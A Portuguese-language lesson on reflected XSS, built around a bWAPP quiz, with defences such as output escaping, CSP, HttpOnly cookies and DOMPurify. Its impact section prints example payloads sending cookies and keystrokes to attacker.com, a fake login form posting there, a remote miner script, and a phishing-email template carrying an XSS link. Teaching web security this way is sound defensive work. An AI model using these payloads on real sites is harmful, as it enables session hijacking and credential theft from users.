## 📖 O que é XSS?

> **Cross-Site Scripting (XSS)** é uma vulnerabilidade onde a aplicação **insere input do usuário em uma página HTML sem sanitização**, fazendo com que o **navegador da vítima execute código JavaScript** controlado pelo atacante.

### Diferença para SQL Injection

| | **SQLi** ([57.md](57.md)) | **XSS** (este lab) |
|--|------|-----|
| **Alvo do código injetado** | Banco de dados | Navegador da vítima |
| **Linguagem injetada** | SQL | JavaScript / HTML |
| **Onde executa** | No servidor | No cliente |
| **Quem é vítima** | A aplicação | Outro usuário |

> 🔑 **A grande sacada:** em XSS, o atacante **não ataca o servidor** — ele usa o servidor como **veículo** para atacar **outros usuários**.

---

## 🗂️ Os 3 Tipos de XSS

| Tipo | Como funciona | Persistência |
|------|--------------|:------------:|
| **1. Reflected (Refletido)** | Payload vem na URL → servidor "reflete" na resposta | ⚡ Temporário (só na sessão da vítima) |
| **2. Stored (Armazenado)** | Payload é salvo no banco → executa para **todos** que visitam a página | 💾 Persistente |
| **3. DOM-based** | Não passa pelo servidor — o **JS do cliente** insere input no DOM | ⚡ Temporário (só no browser) |

### Reflected XSS — o tipo deste lab

```
1. Atacante cria URL maliciosa:
   https://app.com/buscar?q=<script>roubar_cookie()</script>

2. Atacante envia link para vítima (e-mail, mensagem, post)

3. Vítima clica → o servidor "reflete" o payload na resposta

4. O navegador da vítima executa o JavaScript do atacante
   → Roubo de sessão, redirecionamento, keylogging, etc.
```

## 🧠 Por Que Funcionou?

### O código vulnerável (no servidor)

A aplicação faz algo parecido com:

```html
<!-- Template HTML do servidor (vulnerável) -->
<h1>Você buscou por: <?= $_GET['search'] ?></h1>
```

### Quando o usuário digita texto normal

```
Input:  "calabresa"
HTML gerado: <h1>Você buscou por: calabresa</h1>
Browser exibe: "Você buscou por: calabresa"
```

✅ Funcionamento normal.

### Quando o atacante manda o payload

```
Input:  <script>alert(1)</script>
HTML gerado: <h1>Você buscou por: <script>alert(1)</script></h1>
Browser exibe: (executa o script — abre o alert!)
```

🚨 **O browser não distingue** HTML escrito pelo dev e HTML injetado pelo input. Tudo que está dentro da `<h1>` é renderizado igualmente.

### Os 3 elementos da vulnerabilidade

1. **Input não sanitizado** — a aplicação aceita qualquer caractere
2. **Reflexão no HTML** — o input vai pro corpo da página sem escape
3. **Browser executa** — porque é HTML válido

## 🎭 Por Que Isso É Perigoso de Verdade?

O `alert(1)` é só **prova de conceito**. Em um ataque real, o atacante usa esse mesmo "buraco" para coisas como:

### Roubo de sessão (cookie hijacking)

```html
<script>
  fetch('https://attacker.com/?c=' + document.cookie);
</script>
```

A vítima clica no link → seu cookie de sessão é enviado para o servidor do atacante → atacante **assume a conta** sem precisar de senha.

> 🔗 Conexão com [53.md](53.md) — cookies sem `HttpOnly` são vulneráveis a roubo via XSS.

### Phishing convincente

```html
<script>
  document.body.innerHTML = '<form action="https://attacker.com/login">' +
    '<h1>Sessão expirou. Faça login novamente:</h1>' +
    '<input name="user" /><input name="pass" type="password" />' +
    '<button>Login</button></form>';
</script>
```

A vítima vê uma "tela de login" idêntica ao site real **dentro do site real** (a URL não muda!) → digita credenciais → credenciais vão pro atacante.

### Keylogger

```html
<script>
  document.addEventListener('keypress', e => {
    fetch('https://attacker.com/log?k=' + e.key);
  });
</script>
```

Tudo que a vítima digitar na página é enviado para o atacante.

### Cryptojacking

```html
<script src="https://attacker.com/coin-miner.js"></script>
```

CPU da vítima passa a minerar criptomoeda para o atacante.

### Defacement (modificar a página)

```html
<script>
  document.body.style.backgroundColor = 'red';
  document.body.innerHTML = '<h1>HACKED BY XYZ</h1>';
</script>
```

## 🎣 Como o Ataque Chega à Vítima (Phishing)

XSS refletido **não funciona sozinho** — a vítima precisa clicar no link malicioso. Daí entra o **phishing**:

```
┌────────────────────────────────────────────────────────────┐
│ De: "Suporte We Like to Blog" <fake@phishing.com>          │
│ Para: vitima@email.com                                     │
│                                                            │
│ Olá! Achamos uma postagem incrível pra você:               │
│                                                            │
│ https://app.com/?search=<script>roubar_cookie()</script>   │
│       ↑                              ↑                     │
│   URL legítima                Payload XSS embutido         │
│                                                            │
│ Boa leitura!                                               │
└────────────────────────────────────────────────────────────┘
```

A vítima **confia no domínio** (`app.com` é o site real que ela usa), clica, e o ataque executa.

> 🔗 Conexão com [10.md](10.md), [15.md](15.md) — engenharia social/phishing como vetor de entrada.

## 🛡️ Como Prevenir XSS

### 1️⃣ **Escape de output** (a base)

Toda saída no HTML deve ser **escapada** segundo o contexto:

```php
// ❌ Vulnerável
<h1>Você buscou por: <?= $_GET['search'] ?></h1>

// ✅ Seguro — htmlspecialchars escapa <, >, ", ', &
<h1>Você buscou por: <?= htmlspecialchars($_GET['search'], ENT_QUOTES, 'UTF-8') ?></h1>
```

```javascript
// ❌ Vulnerável (Node.js)
res.send(`<h1>Olá ${req.query.nome}</h1>`);

// ✅ Seguro — usar template engine que escapa por padrão (Pug, EJS, Handlebars)
// EJS: <%= nome %> escapa; <%- nome %> NÃO escapa (cuidado!)
res.render('home', { nome: req.query.nome });
```

```jsx
// ✅ React escapa por padrão — NÃO USE dangerouslySetInnerHTML
function Header({ nome }) {
  return <h1>Olá {nome}</h1>;  // seguro
}

// ❌ Vue v-html, Angular [innerHTML] e React dangerouslySetInnerHTML
// quebram a proteção automática — use só com input sanitizado
```

### 2️⃣ **Content Security Policy (CSP)**

Header HTTP que **bloqueia scripts inline** e de domínios não autorizados:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.confiavel.com
```

Com CSP estrita, mesmo se XSS for injetado, o navegador **não executa** scripts inline ou de domínios externos.

### 3️⃣ **Cookies com `HttpOnly`**

Impede que `document.cookie` (em JS) leia o cookie de sessão:

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

> 🔗 Detalhes em [53.md](53.md).

### 4️⃣ **Bibliotecas de sanitização** (quando precisar permitir HTML)

Se a aplicação **precisa aceitar HTML** (ex: editor de blog), use uma biblioteca que **remove só o perigoso**:

- **DOMPurify** (JavaScript) — `DOMPurify.sanitize(html)`
- **bleach** (Python)
- **HtmlSanitizer** (.NET)
- **jsoup** (Java)

```javascript
const clean = DOMPurify.sanitize(userInput);
// <script>alert(1)</script>  → ''  (removido)
// <b>negrito</b>              → <b>negrito</b>  (mantido)
```

### 5️⃣ **Princípio do Contexto**

Cada contexto de output exige **escape diferente**:

| Contexto | Como escapar |
|----------|--------------|
| **HTML body** | `htmlspecialchars` / `&lt;` `&gt;` `&amp;` `&quot;` `&#39;` |
| **HTML attribute** | Idem + aspas |
| **JavaScript string** | `\x3c` em vez de `<`, escape de aspas |
| **URL parameter** | `encodeURIComponent` / `urlencode` |
| **CSS** | Escape Unicode de chars perigosos |

## 🎯 Caso Prático — A Mônica e o bWAPP

> **Cenário:** Mônica está testando uma aplicação vulnerável chamada **bWAPP** (vamos falar dela já já!) e decidiu testar XSS com a tag mais inofensiva possível: `<h1>` (título).
>
> Ela preencheu os campos do formulário:
>
> - **First name:** `<h1>Olá mundo!</h1>`
> - **Last name:** `<h1>Tudo joia?</h1>`
>
> Sabendo que o site é vulnerável a **XSS Refletido**, o que acontece ao clicar em **Go**?

### ✅ Resposta: **C** — A tag é interpretada e o texto vira título

A aplicação vulnerável insere o input direto no HTML, **sem escape**. O navegador recebe:

```html
<!-- HTML renderizado na resposta -->
<p>Welcome <h1>Olá mundo!</h1> <h1>Tudo joia?</h1></p>
```

E interpreta `<h1>` como **HTML real** — não como texto literal. Resultado visual:

```
Welcome

# Olá mundo!                ← H1 = título grande

# Tudo joia?                ← H1 = título grande
```

### 🧠 Por que este teste é importante para o pentester

A Mônica fez algo brilhante: usou uma tag **inofensiva** (`<h1>`) em vez de pular direto para `<script>`. Por quê?

| Estratégia | Vantagem |
|------------|----------|
| Testar com `<h1>` primeiro | Detecta XSS **sem** levantar suspeita / WAF |
| Confirmar que tag é interpretada | Prova de conceito **mínima** mas conclusiva |
| Só então escalar para `<script>` | Reduz chance de bloqueio progressivo |

> 💡 **Princípio do pentester:** *prove o conceito com o payload mais simples possível. Só depois aumente o impacto.*

Outras tags inofensivas para teste inicial:

```html
<b>negrito</b>              <!-- bold -->
<i>itálico</i>              <!-- itálico -->
<u>sublinhado</u>           <!-- underline -->
<font color="red">x</font>  <!-- mudança de cor -->
<marquee>texto</marquee>    <!-- texto rolando -->
```

Se qualquer uma renderizar, **a aplicação é vulnerável a XSS** — basta trocar o payload por algo perigoso.

### ❌ Por que as outras alternativas estão erradas

#### A — "Aplicação ignora a tag" ❌

> *"...exibir em formato normal e ignorando a tag `<h1>`"*

**Erro:** isso descreve uma aplicação **NÃO vulnerável** (com escape correto). O enunciado diz que o site **é vulnerável** — então a tag **é** interpretada.

Aliás, "ignorar a tag" significaria mostrar literalmente `<h1>Olá mundo!</h1>` como texto bruto na tela — que é justamente o comportamento **seguro**.

#### B — "Erro 500 — Internal Server Error" ❌

> *"...código entrará em conflito com duas tags a mais"*

**Erro:** HTML é renderizado **no navegador**, não no servidor. Tags mal formadas **não causam erro 500**. O servidor entrega o HTML como string; o browser **tenta** interpretar o melhor que consegue.

Isso é diferente do caso da **Larissa em SQLi** ([57.md](57.md)) — lá o erro 500 fazia sentido porque o **servidor** quebrava ao processar SQL malformado. Em XSS, o servidor não processa HTML — só entrega para o browser.

#### D — "Aplicação barra o usuário" ❌

> *"...irá detectar uma tag em HTML e irá barrar o usuário"*

**Erro:** se a aplicação barrasse tags HTML, **não seria vulnerável**. O enunciado diz claramente que **é** vulnerável a XSS Refletido.

Aplicações com validação real bloqueariam ANTES do `<h1>` ser processado — o que **não é** o caso aqui.

## 📋 Checklist Anti-XSS

- [ ] Todo output no HTML usa **escape automático** do template engine
- [ ] Não há `innerHTML` / `dangerouslySetInnerHTML` / `v-html` sem sanitização
- [ ] **CSP** configurada (no mínimo `default-src 'self'`)
- [ ] Cookies de sessão com **`HttpOnly`** e `Secure`
- [ ] **DOMPurify** (ou equivalente) para conteúdo rico (editor WYSIWYG)
- [ ] Validação de input no servidor (não confia só no client-side)
- [ ] Headers de segurança: `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`

## 🎓 Conceitos Aprendidos

| Termo | Definição |
|-------|-----------|
| **XSS (Cross-Site Scripting)** | Injeção de código no browser de outros usuários |
| **Reflected XSS** | Payload vem da URL, é refletido na resposta |
| **Stored XSS** | Payload é salvo no banco e executa para todos que visitam |
| **DOM-based XSS** | Manipulação do DOM no cliente, sem passar pelo servidor |
| **Payload** | Código malicioso injetado (ex: `<script>alert(1)</script>`) |
| **CSP** | Content Security Policy — header HTTP que limita scripts |
| **HttpOnly** | Flag de cookie que impede leitura via JavaScript |
| **Escape** | Transformar `<` em `&lt;` etc., para o browser não interpretar |
| **Sanitização** | Remover/transformar partes perigosas do input |

## ✅ Quiz Mental

1. Qual é a **diferença fundamental** entre SQLi e XSS?
2. Por que o `alert(1)` é só prova de conceito? O que um atacante real faria?
3. Por que XSS **refletido** precisa de phishing pra funcionar, e armazenado não?
4. Qual flag de cookie impede que XSS roube a sessão?
5. CSP impede XSS?

<details>
<summary>Ver respostas</summary>

1. **SQLi** ataca o **banco** no **servidor**. **XSS** ataca o **navegador** de **outros usuários**. SQLi é injeção SQL; XSS é injeção HTML/JS
2. `alert(1)` só prova que código arbitrário executa. Ataque real: roubar cookie (`document.cookie` → servidor do atacante), phishing in-page, keylogger, cryptominer, etc.
3. **Refletido** vem da URL → atacante precisa fazer a vítima **clicar** no link malicioso (phishing). **Armazenado** está no banco → executa para **qualquer** visitante normal
4. **`HttpOnly`** — impede `document.cookie` de ler o cookie
5. **Mitiga, não impede.** CSP estrita bloqueia scripts inline e de domínios não autorizados — mesmo com XSS injetado, o navegador recusa executar. Mas CSP mal configurada permite tudo

</details>

## 💡 Reflexão Final

> *"SQL Injection ataca o que o servidor vê.*
> *XSS ataca o que o navegador renderiza.*
>
> *Em SQLi, o atacante usa o servidor para roubar dados do banco.*
> *Em XSS, o atacante usa o servidor para roubar dados dos outros usuários.*
>
> *São dois lados da mesma moeda: input não sanitizado em contexto sensível.*
> *Quem entende um, entende o outro."*

A regra de ouro continua sendo a mesma das outras injeções:

> 🔑 **Nunca confie em input do usuário. Sempre escape no contexto correto.**

Para SQLi: prepared statements.
Para XSS: escape de HTML + CSP + `HttpOnly`.
A doutrina é única — só as ferramentas mudam.
